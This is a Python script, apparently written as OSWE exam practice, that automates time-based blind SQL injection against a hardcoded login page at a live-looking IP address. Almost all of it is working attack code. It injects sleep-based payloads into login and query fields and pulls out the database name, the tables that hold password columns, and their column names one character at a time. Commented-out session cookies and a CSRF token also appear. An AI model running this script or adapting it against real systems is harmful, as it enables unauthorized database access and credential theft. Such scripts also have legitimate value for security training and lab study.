#!/bin/env python3
import requests
import string
print("""
Road to OSWE
Time-base Blind SQLI with python
made with <3 hha the picaro
	""")
time = 3
brutestring = string.ascii_letters+string.digits+"$^&*!@~_-#"
brutestring2 = string.ascii_lowercase+string.digits
url = "http://103.89.49.14/83ec8788fa53209e1baef6cda023ec55/index.php"
# postdata = {'username':'133720','password':'dsfdsf','submit':'Login'}
# cookie = {'security':'low', 'LS-EWWZKYJCMHONCTIL':'ok8ol9lc7fc8bj3uidfggnp4pe', 'YII_CSRF_TOKEN':'aVdrNjJndnRwdEJETlh5TEd4Q2Y4d1dPV05nfjJuVVnlH-DKDvaNPLqJP4EnzYHyN2qBeFxVTFIIIPDKKZ-DUQ%3D%3D', 'PHPSESSID':'ijf1bktqtdoa704iaa9voc9u04'}
def countdb_length():
	delimeter = "_" # 95 = _
	global dblength
	time = 3
	print("[!]Getting Database Length")
	for i in range(1,15):#db length can be only 1 to 30, guess... 
		deli = delimeter*i #_*2
		payload = "' and (select sleep({}) and (select 1 from dual where database() like '{}')) or '1'='1--+".format(time,deli)
		postdata = {"username":"133720","password":"133720{}".format(payload),"submit":"Login"}
		# print(postdata)
		resp = requests.post(url,data = postdata)
		rtext = resp.text
		# print(rtext)
		timetaken = resp.elapsed.total_seconds()
		if timetaken >= time:
			dblength = i
			print("[+] Database length = {}".format(str(dblength)))
			break

def getdb_name():
	global dbname
	flag = True
	tmp = ""
	print('[!] Getting Database Name')
	while flag:
		for s in brutestring:# a b c 
			brutechar  = tmp + s # a
			# print(brutechar)
			payload = "' and (select sleep({}) and (select 1 from dual where database() like '{}%')) or '1'='1--+".format(time,brutechar)
			postdata = {"username":"133720","password":"133720{}".format(payload),"submit":"Login"}
			resp = requests.post(url,data = postdata)
			timetaken = resp.elapsed.total_seconds()
			if timetaken >= time:
				tmp += s
				# print("[!] Found "+tmp)
				if len(tmp) == dblength:
					dbname = tmp
					print("[+] Database Name = {} ".format(dbname))
					flag = False
					break
				else:
					break
def get_tables():
	global table
	flag = True 
	tmp = ""
	print("[!] Dumping tables by guessing column ")
	while flag:
		for s in brutestring:
			brutechar = tmp + s
			# print(brutechar)
			payload = "' and (select sleep({}) and  (select 1 from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '{}%')) and '1'='1&Submit=Submit".format(time,brutechar)
			resp = requests.get(url+payload,cookies=cookie)
			timetaken = resp.elapsed.total_seconds()
			if timetaken >= time:
				tmp += s
				# print("[!] Found " + tmp)
				break
			if s == "#":
				table = tmp
				print("[+] Table Name = {}".format(table))
				flag = False
				break
def column_count():
	tmp = ""
	dict = {}
	for s in brutestring2:
		flag = True
		index = 0
		while flag:
			brutechar = s  # a
			payload = "' and (select sleep({}) and (select 1 from dual where (SELECT @c := count(column_name) from information_schema.columns where table_name='{}' and column_name like '{}%') and (select @c={}))) and '1'='1&Submit=Submit".format(time,table,brutechar,index)
			# print(brutechar)
			resp = requests.get(url+payload,cookies=cookie)
			timetaken = resp.elapsed.total_seconds()
			if timetaken >= time:
				dict[s] = index
				index = 0
				flag = False
			if index > len(brutestring2):
				dict[s] = 0
				flag = False
				index = 0
				break
			else:
				index = index+1
		# print(dict)
	# flag = False 
	return dict

def get_column():
	print("[!] Dumping columns from  {}".format(table))
	global column 
	tmp = ""
	dictdata = column_count()
	limitindex = 0
	for key in dictdata:
		for i in range(0,dictdata[key]):
			flag = True
			while flag:
				for s in brutestring:
					# print("string = {} and i = {} and key = {}".format(s,i,key))
					tmp_key = key #fa
					tmp_col = tmp_key + s #fab
					brutechar = tmp_col
					payload = "' and (select sleep({}) and (select 1 from dual where (select column_name from information_schema.columns where table_schema=database() and table_name='{}' and column_name like '{}%' limit {},1) like '%')) and '1'='1&Submit=Submit".format(time,table,brutechar,i)
					resp = requests.get(url+payload,cookies=cookie)
					timetaken = resp.elapsed.total_seconds()
					# print(payload)
					if timetaken >= time:
						key = key + s
						print("[!] Found column " + key)
						break
					if s == "#":
						column = key
						tmp = ""
						# limitindex += 1
						flag = False
						break

countdb_length()
getdb_name()
get_tables()
# # column_count()
# get_column()

# 1st loop key = f  string = a key+string = a 
# second loop key = fa string = b key+ string = fab